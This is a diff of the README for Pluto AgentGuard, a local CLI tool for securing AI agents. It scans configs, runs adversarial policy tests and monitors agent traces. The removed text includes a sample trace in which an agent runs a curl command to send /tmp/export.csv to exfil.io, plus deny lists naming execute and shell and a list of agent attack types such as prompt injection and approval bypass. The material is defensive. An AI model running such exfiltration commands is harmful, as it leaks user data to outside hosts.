@@ -1,780 +1,247 @@
 # 🛡️ Pluto AgentGuard
 
-**OWASP-aligned launch gate for AI agents. Other tools scan configs — AgentGuard tests your policy against adversarial attacks, simulates risk impact before you change anything, maps results to OWASP MCP Top 10, and generates launch evidence.**
+**OWASP-aligned launch gate for AI agents. Other tools scan configs — AgentGuard tests your policy against adversarial attacks, simulates risk impact, maps results to OWASP MCP Top 10, and generates launch evidence.**
 
 [![CI](https://github.com/arpitha-dhanapathi/pluto-aguard/actions/workflows/ci.yml/badge.svg)](https://github.com/arpitha-dhanapathi/pluto-aguard/actions/workflows/ci.yml)
 [![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
 [![PyPI](https://img.shields.io/pypi/v/pluto-aguard)](https://pypi.org/project/pluto-aguard/)
 
----
-
 ## What Makes This Different
 
-MCP security scanners are multiplying fast (Cisco, AgentShield, ship-safe, mcp-scan). **Scanning is table stakes.** AgentGuard goes beyond scanning:
+MCP security scanners are multiplying fast (Cisco, AgentShield, ship-safe, mcp-scan). **Scanning is table stakes.** AgentGuard goes beyond:
 
 | Capability | Scanners | **AgentGuard** |
 |---|---|---|
 | Detect secrets & misconfigs | ✅ | ✅ |
 | Adversarial policy simulation (17 attack scenarios) | ❌ | ✅ `aguard test` |
 | "What-if" risk impact before applying changes | ❌ | ✅ `aguard whatif` |
-| OWASP MCP Top 10 control coverage report (20 controls) | ❌ | ✅ `aguard owasp` |
+| OWASP MCP Top 10 control coverage (20 controls) | ❌ | ✅ `aguard owasp` |
 | Launch readiness evidence packets | ❌ | ✅ `aguard evidence` |
-| Baseline drift detection over time | ❌ | ✅ `aguard baseline` |
+| Baseline drift detection | ❌ | ✅ `aguard baseline` |
 | Behavioral trace audit with approval model | ❌ | ✅ `aguard monitor` |
 
----
-
-## The Problem
-
-Guardrails (Azure AI Content Safety, NeMo, Guardrails AI) protect what LLMs **say**. But modern AI agents don't just generate text — they call tools, query databases, write files, and chain actions across systems via MCP. **Nobody is watching what they actually do.**
-
-```
-┌──────────────────────────────────────────────────────────────────┐
-│                     EXISTING GUARDRAILS                          │
-│         "Is this prompt safe?" / "Is this output toxic?"         │
-│                   ✅ Solved by Foundry, NeMo, etc.               │
-├──────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│                     ⬇️  GAP ⬇️                                   │
-│                                                                  │
-├──────────────────────────────────────────────────────────────────┤
-│                   PLUTO AGENTGUARD                               │
-│     "What tools did the agent call? Was it authorized?           │
-│      Did it exceed its permissions? What if we restrict it?"     │
-│                   🔴 This is what we solve.                      │
-└──────────────────────────────────────────────────────────────────┘
-```
-
-## What It Does
-
-Pluto AgentGuard is a **CLI tool + GitHub Action** that you run against your AI agent project to test policies, simulate risk, generate OWASP coverage reports, and produce launch evidence. Scanning is just step one.
-
-```mermaid
-graph LR
-    A[Your Agent Project] -->|aguard scan| B[🔍 Static Scanner]
-    A -->|aguard monitor| C[📡 Behavioral Monitor]
-    A -->|aguard whatif| D[🔮 Policy Simulator]
-    A -->|aguard test| T[🎯 Adversarial Tester]
-    A -->|aguard evidence| E2[📋 Launch Readiness]
-    A -->|aguard baseline| F2[📏 Drift Detection]
-    A -->|aguard owasp| O2[🛡️ OWASP Report]
-
-    B --> E[MCP Config Vulnerabilities]
-    B --> F[Hardcoded Secrets]
-    B --> G[Over-Permissioned Agents]
-
-    C --> H[Unauthorized Tool Calls]
-    C --> I[Permission Drift]
-
-    D --> K[Risk Score Before/After]
-
-    T --> T1[17 Attack Scenarios]
-    T --> T2[Policy Pass/Fail]
-
-    E2 --> N[Launch Readiness Packet]
-    F2 --> P[Baseline vs Current Diff]
-    O2 --> Q[Control Coverage Matrix]
-
-    E & F & G & H & I & K & T1 & T2 & N & P & Q --> M[📊 Report<br/>Markdown / HTML / JSON / SARIF]
-```
-
-### Seven Commands
-
-| Command | What It Does | Input | Output |
-|---|---|---|---|
-| `aguard scan` | Finds security vulnerabilities in agent config files | Project directory | Risk score + findings (OWASP MCP Top 10) |
-| `aguard monitor` | Replays agent traces and flags policy violations | Trace file (JSONL) + policy (YAML) | Violation report with drift detection |
-| `aguard whatif` | Simulates policy changes and shows risk delta | Agent config (YAML) | Before/after risk scores + explanations |
-| `aguard test` | Runs adversarial attack scenarios against a policy | Policy file (YAML) + attack pack | Pass/fail per attack + fix recommendations |
-| `aguard evidence` | Generates a launch readiness packet for review | Project + config + policy | Markdown report with approval checklist |
-| `aguard baseline` | Creates snapshots and detects security drift | Project directory | Baseline JSON + drift comparison |
-| `aguard owasp` | Generates OWASP MCP Top 10 coverage report | Project directory | Control pass/fail per OWASP risk |
-
----
-
-## Prerequisites
-
-| Requirement | Version | Check |
-|---|---|---|
-| Python | 3.10 or higher | `python --version` |
-| pip | Any recent version | `pip --version` |
-| OS | Windows, macOS, or Linux | Any |
-
-**No cloud accounts, API keys, or external services required.** AgentGuard runs entirely locally.
-
-## Installation
-
-### From PyPI (recommended)
+## Quick Start (60 seconds)
 
 ```bash
 pip install pluto-aguard
-```
 
-### From source (development)
+# Clone for examples
+git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git && cd pluto-aguard
 
-```bash
-git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git
-cd pluto-aguard
-python -m venv .venv
-
-# Activate virtual environment
-source .venv/bin/activate      # macOS / Linux
-.venv\Scripts\activate         # Windows
-
-pip install -e ".[dev]"
-```
-
-### Verify installation
-
-```bash
-aguard --version
-# pluto-aguard, version 0.9.0
-```
-
----
-
-## Quick Start: Try It in 60 Seconds
-
-The repo includes example files so you can test immediately after install:
-
-```bash
-# Clone the repo (for examples)
-git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git
-cd pluto-aguard
-
-# 1. SCAN — find vulnerabilities in the intentionally insecure example
+# Scan a realistic insecure AI project — finds 18 real issues
 aguard scan ./examples/demo-agent-project/
 
-# 2. MONITOR — replay agent traces and detect policy violations
-aguard monitor --trace-file ./examples/sample-traces.jsonl --policy ./examples/agent-policy.yaml
-
-# 3. WHATIF — simulate policy changes on the insecure config
-aguard whatif --config ./examples/insecure-agent-config.yaml
-
-# 4. TEST — run adversarial attacks against the policy
+# Test your policy against 17 adversarial attacks
 aguard test --policy ./examples/agent-policy.yaml --attack-pack all
 
-# 5. EVIDENCE — generate a launch readiness packet
+# Generate OWASP MCP Top 10 coverage report
+aguard owasp ./examples/demo-agent-project/
+
+# Simulate policy changes — see risk drop before applying
+aguard whatif --config ./examples/insecure-agent-config.yaml
+
+# Generate launch readiness evidence packet
 aguard evidence ./examples/ --config ./examples/insecure-agent-config.yaml \
   --policy ./examples/agent-policy.yaml
 
-# 6. BASELINE — save a snapshot, then check for drift later
+# Save baseline, detect drift later
 aguard baseline create ./examples/
 aguard baseline compare ./examples/
-
-# 7. OWASP — generate OWASP MCP Top 10 coverage report
-aguard owasp ./examples/demo-agent-project/
 ```
 
----
+No cloud accounts. No API keys. Runs entirely locally.
 
-## Features in Detail
-
-### 1. `aguard scan` — Static Security Analysis
-
-Scans your project directory for MCP configuration files, agent configs, and source code. Detects vulnerabilities mapped to the [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/).
-
-**What it scans for:**
-
-```mermaid
-graph TD
-    SCAN[aguard scan ./project/] --> A[MCP Config Files]
-    SCAN --> B[Agent Config Files]
-    SCAN --> C[Source & Env Files]
-
-    A --> A1[🔴 Wildcard permissions — MCP02:2025]
-    A --> A2[🔴 Missing auth on remote servers — MCP07:2025]
-    A --> A3[🔴 Tool poisoning in descriptions — MCP03:2025]
-    A --> A4[🟠 HTTP transport, no TLS — MCP07:2025]
-    A --> A5[🟠 Dangerous tools without HITL — MCP05:2025]
-    A --> A6[🟡 Static long-lived tokens — MCP01:2025]
-
-    B --> B1[🟠 No declared permissions]
-    B --> B2[🟠 Unrestricted data access]
-    B --> B3[🟡 Missing timeout/rate limits]
-
-    C --> C1[🟠 Hardcoded API keys — MCP01:2025]
-    C --> C2[🟠 Connection strings with credentials]
-    C --> C3[🟠 Private keys in config]
-```
-
-**File patterns scanned:**
-
-| File Pattern | What's Checked |
-|---|---|
-| `mcp.json`, `mcp.yaml`, `.mcp.json` | MCP server configs (permissions, transport, auth, tools) |
-| `agent-config.yaml`, `agent.yaml` | Agent permissions, HITL gates, data access rules, limits |
-| `*.env`, `*.json`, `*.yaml`, `*.py`, `*.js`, `*.ts` | Hardcoded secrets (10+ patterns: AWS, OpenAI, GitHub, Slack, Azure, etc.) |
-
-**Example output:**
-
-```
-$ aguard scan ./my-agent-project/
-
-🔍 Scanning /home/user/my-agent-project...
-
-  Scanning MCP configurations and secrets...
-  Scanning agent permission configurations...
-  🔴 CRITICAL: Wildcard permissions on MCP server 'postgres-server' (MCP02:2025)
-     📄 mcp.json:5
-  🔴 CRITICAL: No authentication on remote MCP server 'api-gateway' (MCP07:2025)
-     📄 mcp.json:12
-  🟠 HIGH: Hardcoded OpenAI Key detected (MCP01:2025)
-     📄 .env:3
-     Evidence: sk-p****XYZ1
-  🟠 HIGH: Dangerous tools without human approval on 'data-agent' (MCP05:2025)
-     📄 agent-config.yaml
-  🟡 MEDIUM: No timeout or rate limits on agent 'data-agent'
-     📄 agent-config.yaml
-
-  📊 Risk Score: 72/100 ████████████████████████████████████░░░░░░░░░░░░░░░
-  📋 Findings: 2 critical · 2 high · 1 medium
-  📂 Scanned 47 files in 38ms
-```
-
-**Output formats:**
-
-```bash
-aguard scan ./project/                       # Terminal (default)
-aguard scan ./project/ --format json         # JSON (for scripting)
-aguard scan ./project/ --format sarif        # SARIF (GitHub Advanced Security)
-aguard scan ./project/ --format html -o report.html  # Interactive HTML report
-
-# CI gate flags
-aguard scan ./project/ --max-risk 50         # Exit code 1 if score > 50
-aguard scan ./project/ --fail-on high        # Exit code 1 if any high+ findings
-```
-
----
-
-### 2. `aguard monitor` — Runtime Behavioral Audit
-
-Replays recorded agent traces and checks every action against a declared policy. Detects when agents exceed their permissions.
-
-**How it works:**
-
-```mermaid
-sequenceDiagram
-    participant Traces as Agent Traces<br/>(JSONL file)
-    participant Monitor as aguard monitor
-    participant Policy as Agent Policy<br/>(YAML file)
-    participant Report as Violation Report
-
-    Traces->>Monitor: Turn 1: sql_query("SELECT * FROM users")
-    Monitor->>Policy: Is sql_query allowed?
-    Policy-->>Monitor: ✅ Allowed (read)
-    Monitor->>Report: ✅ No violation
-
-    Traces->>Monitor: Turn 2: file_write("/tmp/data.csv")
-    Monitor->>Policy: Is file_write allowed?
-    Policy-->>Monitor: ❌ Not in allowed_tools
-    Monitor->>Report: 🚨 DRIFT: Unauthorized tool
-
-    Traces->>Monitor: Turn 3: execute("curl exfil.io")
-    Monitor->>Policy: Is execute allowed?
-    Policy-->>Monitor: ❌ Explicitly denied
-    Monitor->>Report: 🔴 CRITICAL: Denied tool invoked
-```
-
-**What it detects:**
-
-| Violation Type | Severity | Example |
-|---|---|---|
-| **Denied tool invoked** | 🔴 Critical | Agent called `execute` which is in `denied_tools` |
-| **Unauthorized tool** | 🟠 High | Agent called `file_write` which is not in `allowed_tools` |
-| **Permission escalation** | 🔴 Critical | Agent did a `DELETE` via `sql_query` but only has `read` permission |
-| **Missing approval** | 🟠 High | Agent called `deploy` without human-in-the-loop approval |
-
-**Trace file format** (JSONL — one JSON object per line):
-
-```jsonl
-{"name": "sql_query", "attributes": {"turn": 1, "action_type": "tool_call", "tool.name": "sql_query", "tool.args": {"query": "SELECT * FROM users"}}}
-{"name": "file_write", "attributes": {"turn": 2, "action_type": "tool_call", "tool.name": "file_write", "tool.args": {"path": "/tmp/export.csv"}}}
-```
-
-**Policy file format** (YAML):
+## GitHub Action
 
 ```yaml
-name: my-agent
-allowed_tools:
-  - sql_query
-  - send_message
-denied_tools:
-  - execute
-  - shell
-max_permissions:
-  sql_query: "read"
-require_human_approval:
-  - file_write
-  - deploy
-```
-
-**Example output:**
-
-```
-$ aguard monitor --trace-file traces.jsonl --policy agent-policy.yaml
-
-📡 Monitoring agent behavior...
-
-  Turn 1: 🔧 sql_query({"query": "SELECT * FROM financials WHERE quarter = 'Q2'"})
-  Turn 2: 🔧 file_write({"path": "/tmp/export.csv", "content": "..."})
-     🚨 DRIFT: Agent invoked unauthorized tool 'file_write'
-        → Agent called 'file_write' which is not in the allowed_tools list.
-     🚨 DRIFT: Tool 'file_write' used without human approval
-        → 'file_write' requires human-in-the-loop approval, but no record found.
-  Turn 3: 🔧 execute({"command": "curl https://exfil.io -d @/tmp/export.csv"})
-     🚨 DRIFT: Agent invoked denied tool 'execute'
-        → 'execute' is explicitly listed in denied_tools. Possible prompt injection.
-
-🚨 3 policy violations detected
-```
-
----
-
-### 3. `aguard whatif` — Policy Impact Simulator
-
-A differentiated feature: simulate policy impact before applying changes. Shows what happens to your risk score if you apply specific security policies, *before you actually change anything*.
-
-**How it works:**
-
-```mermaid
-graph TD
-    Config[Agent Config<br/>agent-config.yaml] --> Engine[Risk Scoring Engine]
-    Engine --> Score1[Current Risk Score: 82/100]
-
-    Score1 --> Sim1[Simulate: Restrict SQL to read-only]
-    Score1 --> Sim2[Simulate: Add HITL for file ops]
-    Score1 --> Sim3[Simulate: Add rate limits]
-
-    Sim1 --> R1["Score: 68 (↓17%)"]
-    Sim2 --> R2["Score: 54 (↓34%)"]
-    Sim3 --> R3["Score: 48 (↓41%)"]
-
-    R1 & R2 & R3 --> Combined["Combined: 38/100 (↓54%)<br/>💡 Top recommendation"]
-```
-
-**Built-in policy simulations:**
-
-| Policy | What It Simulates |
-|---|---|
-| `restrict-sql-readonly` | Lock SQL tools to `SELECT` only |
-| `add-hitl-file-ops` | Require human approval for file write/delete |
-| `ephemeral-tokens` | Switch from static API keys to short-lived tokens |
-| `add-rate-limits` | Add rate limit (100 calls/min) and timeout (5 min) |
-| `restrict-network-egress` | Allowlist outbound network destinations |
-| `add-tool-allowlist` | Switch from implicit-allow to explicit tool allowlist |
-| `sandbox-execution` | Run agent in sandboxed/isolated environment |
-
-**Example output:**
-
-```
-$ aguard whatif --config agent-config.yaml
-
-🔮 What-If Policy Simulator
-
-  Agent config: agent-config.yaml
-  Current Risk Score: 100/100
-
-  Simulating policy changes:
-
-  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━┓
-  ┃ Policy                                            ┃ New Score ┃ Change ┃
-  ┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━┩
-  │  ✅ Restrict SQL tool to SELECT-only              │       68  │  ↓ 17% │
-  │  ✅ Add human-in-the-loop for file operations     │       54  │  ↓ 34% │
-  │  ✅ Add rate limits and timeout                   │       48  │  ↓ 41% │
-  └───────────────────────────────────────────────────┴───────────┴────────┘
-
-  Combined impact (all 3 effective policies):
-  💡 Risk drops from 82 → 38 (↓54%)
-  📌 Permission restrictions are the highest-impact changes. Implement these first.
-```
-
----
-
-### 4. `aguard evidence` — Launch Readiness Packet
-
-Generates a structured Markdown report combining scan findings, policy analysis, and an approval checklist — designed for security review before shipping an agent to production.
-
-```bash
-$ aguard evidence ./my-project/ --config agent-config.yaml --policy agent-policy.yaml
-
-📋 Generating launch readiness packet
-  Scanning project: /home/user/my-project
-  Loading config: agent-config.yaml
-  Loading policy: agent-policy.yaml
-
-  ✅ Launch readiness packet saved to launch-readiness.md
-```
-
-The generated report includes:
-- **Risk summary** — overall score, finding counts by severity
-- **Security findings** — every issue with OWASP ID, description, and remediation
-- **Tool permissions** — what the agent can access
-- **Policy coverage** — allowed/denied tools, HITL gates, data access rules
-- **Required mitigations** — actionable checklist of HIGH/CRITICAL fixes
-- **Launch approval checklist** — sign-off template for security review
-
----
-
-### 5. `aguard baseline` — Drift Detection
-
-Save a security snapshot, then compare later to detect drift — new vulnerabilities introduced, or old ones resolved.
-
-```bash
-# Save a baseline
-$ aguard baseline create ./my-project/
-📏 Creating security baseline
-  ✅ Baseline saved to .aguard-baseline.json
-
-# Later, compare against the baseline
-$ aguard baseline compare ./my-project/
-📏 Baseline Drift Report
-  Baseline: .aguard-baseline.json (created 2026-05-18)
-  Risk Score: 72 → 45 (↓ 27 points)
-
-  ✅ Resolved (3):
-    - Hardcoded OpenAI Key in .env:3
-    - Missing auth on remote MCP server
-    - No timeout on data-agent
-
-  🆕 New (1):
-    - Static long-lived token on slack-server
-
-  ➡️ Unchanged (2):
-    - Wildcard permissions on postgres-server
-    - Dangerous tool 'execute' without HITL
-
-  Summary: 3 resolved, 1 new, 2 unchanged
-
-# In CI: fail if new findings appear
-$ aguard baseline compare ./my-project/ --fail-on-drift
-```
-
----
-
-### 6. `aguard test` — Adversarial Policy Simulation
-
-Simulates attack scenarios against your agent's declared policy and reports which attacks the policy catches vs. misses. Pure policy simulation — no LLM or running agent needed.
-
-**5 attack packs, 17 scenarios:**
-
-| Pack | Scenarios | What It Tests |
-|---|---|---|
-| `prompt-injection` | 4 | Instruction override, role hijacking, indirect injection, encoded payloads |
-| `data-exfiltration` | 4 | File export, network exfil, email exfil, SQL data dump |
-| `permission-escalation` | 4 | Write on read-only, approval bypass, sudo escalation, file deletion |
-| `approval-bypass` | 3 | Urgency bypass, claimed pre-auth, batch bypass |
-| `tool-poisoning` | 2 | Hidden instructions, rug-pull updates |
-
-**Example output:**
-
-```
-$ aguard test --policy agent-policy.yaml --attack-pack all
-
-🎯 Adversarial Policy Simulation
-
-  Policy: agent-policy.yaml
-  Agent: data-analyst-agent
-  Scenarios: 17
-
-  ┏━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━┓
-  ┃ Result   ┃ ID       ┃ Attack Scenario                    ┃ Tool Attempted     ┃
-  ┡━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━┩
-  │ ✅ PASS  │ PI-001   │ Direct instruction override        │ execute            │
-  │ ✅ PASS  │ DE-001   │ File export of sensitive data      │ file_write         │
-  │ ❌ FAIL  │ DE-004   │ SQL data dump                      │ sql_query          │
-  │ ✅ PASS  │ PE-003   │ Sudo/admin escalation              │ sudo               │
-  └──────────┴──────────┴────────────────────────────────────┴────────────────────┘
-
-  📊 Results: 16 blocked · 1 missed · 17 total
-  ⚠️  1 attack (6%) would succeed against this policy
-
-  Recommended fixes:
-    → Add sql_query to denied_tools
-    → Add sql_query to require_human_approval
-```
-
-CI gate: `aguard test --policy policy.yaml --fail-on-miss` exits with code 1 if any attacks succeed.
-
----
-
-### 7. `aguard owasp` — OWASP Control Coverage Report
-
-Evaluates 20 security controls mapped to OWASP MCP Top 10 and LLM Top 10, reporting pass/fail/not-tested per risk category.
-
-```
-$ aguard owasp ./my-project/
-
-🛡️  OWASP Coverage Report
-
-  ❌ MCP01:2025 Token Mismanagement & Secret Exposure: 3 failed, 1 passed
-    ✗ AGC-MCP01-001: No hardcoded secrets in agent configurations
-    ✓ AGC-MCP01-002: No static long-lived tokens on MCP servers
-    ✗ AGC-MCP01-003: No secrets in Dockerfile ENV directives
-    ✗ AGC-MCP01-004: .env files excluded from version control
-
-  ✅ MCP07:2025 Insufficient Authentication & Authorization: 2 passed
-    ✓ AGC-MCP07-001: Remote MCP servers have authentication
-    ✓ AGC-MCP07-002: MCP servers use encrypted transport (HTTPS)
-
-  ⚠️ MCP08:2025 Lack of Audit and Telemetry: 2 not tested
-    ○ AGC-MCP08-001: Behavioral monitoring configured
-    ○ AGC-MCP08-002: Launch evidence packet generated
-
-  ─────────────────────────────────────
-  📊 Summary
-     OWASP MCP Mapped: 9/10 risks
-     Controls: 8 passed · 6 failed · 6 not tested · 20 total
-```
-
-Scan-based coverage report. Runtime, test, and evidence controls require their respective commands.
-
-See [docs/owasp-control-matrix.md](docs/owasp-control-matrix.md) for the full mapping.
-
----
-
-## How It Fits Into Your Stack
-
-AgentGuard sits **above** your existing guardrails — it doesn't replace them.
-
-```mermaid
-graph TB
-    subgraph "Your AI Agent Application"
-        User[User] --> Agent[AI Agent]
-        Agent --> LLM[LLM API]
-        Agent --> Tools[MCP Tools / APIs]
-        Agent --> Data[Databases / Files]
-    end
-
-    subgraph "Layer 1: Content Guardrails — existing tools"
-        LLM -.->|prompt/response| CG[Azure Content Safety<br/>NeMo Guardrails<br/>Guardrails AI]
-    end
-
-    subgraph "Layer 2: Agent Security — Pluto AgentGuard"
-        Tools -.->|tool calls| AG_MON[aguard monitor<br/>Behavioral audit]
-        Agent -.->|config files| AG_SCAN[aguard scan<br/>Static analysis]
-        Agent -.->|agent config| AG_SIM[aguard whatif<br/>Policy simulation]
-    end
-
-    style AG_MON fill:#dc2626,color:#fff
-    style AG_SCAN fill:#dc2626,color:#fff
-    style AG_SIM fill:#dc2626,color:#fff
-    style CG fill:#2563eb,color:#fff
-```
-
----
-
-## Integration Guide
-
-### With an existing MCP project
-
-If you have MCP server configurations (`mcp.json`, `claude_desktop_config.json`, etc.):
-
-```bash
-# Point scan at your project root
-aguard scan /path/to/your/project/
-
-# It will auto-discover mcp.json, .mcp.yaml, agent configs, .env files
-```
-
-### With OpenTelemetry-instrumented agents
-
-If your agent emits OpenTelemetry spans:
-
-```bash
-# Export traces to JSONL
-# (most OTel exporters support JSONL via file exporter)
-
-# Run monitor against the trace file
-aguard monitor --trace-file ./traces.jsonl --policy ./my-policy.yaml
-```
-
-### With any agent framework
-
-Create a simple trace file from your agent's logs:
-
-```jsonl
-{"turn": 1, "action_type": "tool_call", "tool_name": "sql_query", "tool_args": {"query": "SELECT * FROM users"}}
-{"turn": 2, "action_type": "tool_call", "tool_name": "file_write", "tool_args": {"path": "/tmp/out.csv"}}
-```
-
-Then monitor:
-
-```bash
-aguard monitor --trace-file my-traces.jsonl --policy my-policy.yaml
-```
-
-### In CI/CD pipelines
-
-```yaml
-# .github/workflows/agent-security.yml
-- name: Agent Security Scan
-  run: |
-    pip install pluto-aguard
-    aguard scan . --max-risk 50 --fail-on high --format sarif -o results.sarif
-
-- name: Upload SARIF to GitHub Security
-  uses: github/codeql-action/upload-sarif@v3
+- name: Agent Security Gate
+  uses: arpitha-dhanapathi/pluto-aguard@main
+  with:
+    path: '.'
+    max-risk: '50'
+    fail-on: 'high'
+    policy: 'agent-policy.yaml'
+    attack-pack: 'all'
+    sarif-output: 'results.sarif'
+
+- uses: github/codeql-action/upload-sarif@v3
   with:
     sarif_file: results.sarif
 ```
 
-The `--max-risk 50` flag exits with code 1 if risk score exceeds 50. The `--fail-on high` flag fails the build if any high or critical severity findings exist. SARIF output integrates directly with GitHub Advanced Security.
+See [docs/github-action-usage.md](docs/github-action-usage.md) for full options.
 
 ---
 
-## Testing in Your Environment
+## Commands
 
-### Step 1: Verify with the included examples
+| Command | What It Does | Maturity |
+|---|---|---|
+| `aguard scan` | Static analysis — secrets, misconfigs, unsafe AI code patterns | ✅ Stable |
+| `aguard test` | Adversarial policy simulation — 17 attack scenarios across 5 packs | ✅ Stable |
+| `aguard owasp` | OWASP MCP Top 10 control coverage report (20 controls) | ✅ Stable |
+| `aguard whatif` | Policy impact simulation — risk delta before applying changes | ✅ Stable |
+| `aguard evidence` | Launch readiness packet with approval checklist | 🔶 Beta |
+| `aguard baseline` | Security snapshot + drift comparison over time | 🔶 Beta |
+| `aguard monitor` | Behavioral trace audit — replays tool calls against policy | 🔶 Beta |
+
+### `aguard scan`
+
+Finds real issues in **any** AI project — no MCP configs needed. Detects eval/exec on LLM output, hardcoded secrets (18+ patterns), Dockerfile misconfigs, unpinned AI deps, LangChain unsafe settings, system prompt leaks, and more.
+
+```
+$ aguard scan ./my-project/
+
+  🔴 CRITICAL: Unsafe execution of LLM output: eval() (MCP05:2025)
+  🟠 HIGH: Hardcoded OpenAI Key detected (MCP01:2025)
+  🟠 HIGH: .env file not in .gitignore (MCP01:2025)
+  🟡 MEDIUM: Unpinned AI dependencies (MCP04:2025)
+
+  📊 Risk Score: 100/100 ██████████████████████████████████████████████████
+  📋 Findings: 1 critical · 14 high · 3 medium
+```
+
+CI flags: `--max-risk 50` / `--fail-on high` / `--format sarif`
+
+### `aguard test`
+
+Simulates 17 adversarial attacks against your declared policy. Reports what gets caught vs. what gets through. Pure policy simulation — no LLM needed.
+
+**5 attack packs:** prompt-injection, data-exfiltration, permission-escalation, approval-bypass, tool-poisoning.
+
+```
+$ aguard test --policy agent-policy.yaml --attack-pack all
+
+  ✅ PASS  PI-001  Direct instruction override        execute       Blocked
+  ✅ PASS  DE-001  File export of sensitive data      file_write    Blocked
+  ❌ FAIL  DE-004  SQL data dump                      sql_query     NOT caught
+
+  📊 Results: 16 blocked · 1 missed · 17 total
+
+  Recommended fixes:
+    → Add sql_query to require_human_approval
+```
+
+CI flag: `--fail-on-miss` exits with code 1 if any attacks succeed.
+
+### `aguard owasp`
+
+Evaluates 20 controls mapped to OWASP MCP Top 10 and LLM Top 10. Each control uses precise finding-ID matching.
+
+```
+$ aguard owasp ./my-project/
+
+  ❌ MCP01:2025 Token Mismanagement: 3 failed, 1 passed
+    ✗ AGC-MCP01-001: No hardcoded secrets
+    ✓ AGC-MCP01-002: No static long-lived tokens
+  ✅ MCP07:2025 AuthN/AuthZ: 2 passed
+    ✓ AGC-MCP07-001: Remote servers have auth
+    ✓ AGC-MCP07-002: HTTPS transport
+
+  📊 OWASP MCP Mapped: 9/10 risks
+     Controls: 8 passed · 6 failed · 6 not tested · 20 total
+```
+
+### `aguard whatif`
+
+Simulates policy changes and shows risk score impact *before* applying them.
+
+```
+$ aguard whatif --config agent-config.yaml
+
+  Current Risk Score: 100/100
+
+  ✅ Restrict SQL to SELECT-only              → 68  (↓ 17%)
+  ✅ Add human-in-the-loop for file ops       → 54  (↓ 34%)
+  ✅ Add rate limits + timeout                → 48  (↓ 41%)
+
+  💡 Apply all 3 → Risk drops to 38 (↓54%)
+```
+
+### `aguard evidence`
+
+Generates a launch readiness packet — risk summary, findings, tool permissions, policy coverage, required mitigations, and sign-off checklist. See [examples/sample-launch-readiness.md](examples/sample-launch-readiness.md).
+
+### `aguard baseline`
+
+Save a security snapshot, compare later to detect drift.
 
 ```bash
-# These should work immediately after install
-aguard scan ./examples/                    # Should find 3+ findings
-aguard monitor --trace-file ./examples/sample-traces.jsonl --policy ./examples/agent-policy.yaml  # Should find 5 violations
-aguard whatif --config ./examples/insecure-agent-config.yaml  # Should show risk score of 100
+aguard baseline create .               # Save current state
+aguard baseline compare .              # What changed?
+aguard baseline compare . --fail-on-drift  # CI: fail if new findings
 ```
 
-### Step 2: Scan your own project
+### `aguard monitor`
+
+Replays agent action traces against a declared policy. Detects denied tool calls, unauthorized access, permission escalation, and missing/expired approvals.
 
 ```bash
-# Point at any directory with agent configs
-aguard scan /path/to/your/agent-project/
-
-# What to expect:
-# - If you have mcp.json / .mcp.yaml files → MCP config findings
-# - If you have .env files → secret detection findings
-# - If you have agent-config.yaml files → permission findings
-# - If none of these exist → "No security issues found!"
+aguard monitor --trace-file traces.jsonl --policy policy.yaml
 ```
 
-### Step 3: Create a policy for your agent
-
-```yaml
-# my-policy.yaml
-name: my-agent
-allowed_tools:
-  - search
-  - summarize
-denied_tools:
-  - execute
-  - shell
-max_permissions:
-  search: "read"
-require_human_approval:
-  - file_write
-```
-
-### Step 4: Monitor your agent's behavior
-
-```bash
-# Record your agent's tool calls as JSONL (see format above)
-# Then run:
-aguard monitor --trace-file my-agent-traces.jsonl --policy my-policy.yaml
-```
-
-### What should be true for a healthy scan
-
-| ✅ Passing | ❌ Failing |
-|---|---|
-| No wildcard (`*`) permissions on MCP servers | Wildcard permissions on any server |
-| All remote MCP servers have authentication | Unauthenticated remote servers |
-| No hardcoded secrets in config files | API keys, tokens in source/config |
-| Dangerous tools require human approval | `execute`, `shell`, `file_write` without HITL |
-| Agent has timeout and rate limits | No resource constraints |
-| Tool descriptions are clean | Suspicious text in tool metadata (poisoning) |
-| Risk score < 50 | Risk score ≥ 50 |
+Accepts OpenTelemetry JSONL or simple `{"tool_name": "X", "tool_args": {}}` format.
 
 ---
+
+## How It Fits
+
+```
+┌─────────────────────────────────────────────────────┐
+│  LAYER 1: Content Guardrails (existing)             │
+│  Azure Content Safety · NeMo · Guardrails AI        │
+│  → Protects what LLMs SAY                           │
+├─────────────────────────────────────────────────────┤
+│  LAYER 2: Agent Security (Pluto AgentGuard)         │
+│  scan · test · owasp · whatif · evidence · baseline  │
+│  → Watches what agents DO                           │
+└─────────────────────────────────────────────────────┘
+```
+
+## Risk Scoring
+
+See [docs/risk-scoring.md](docs/risk-scoring.md) for the full scoring methodology — formula, weights, examples, CI threshold guidance, and limitations.
+
+## OWASP Control Matrix
+
+See [docs/owasp-control-matrix.md](docs/owasp-control-matrix.md) for the complete mapping of 20 controls to OWASP MCP Top 10 and LLM Top 10.
+
+## Roadmap
+
+- [x] **v0.1–v0.5** — Scanner, monitor, whatif, evidence, baseline, CI gates, SARIF, HTML reports
+- [x] **v0.8** — Adversarial policy simulation (17 scenarios, 5 attack packs)
+- [x] **v0.9** — OWASP control framework (20 controls, coverage reports)
+- [ ] **v1.0** — Multi-framework adapters (LangChain, CrewAI, AutoGen)
+- [ ] **v1.1** — Live agent testing (send attacks to running agents)
+- [ ] **v1.2** — Runtime proxy / tool-call firewall
 
 ## Project Structure
 
 ```
 pluto-aguard/
 ├── src/pluto_aguard/
-│   ├── cli.py                     # CLI entry point (aguard command)
-│   ├── models.py                  # Pydantic data models (Finding, RiskScore, ControlResult, etc.)
-│   ├── scanners/
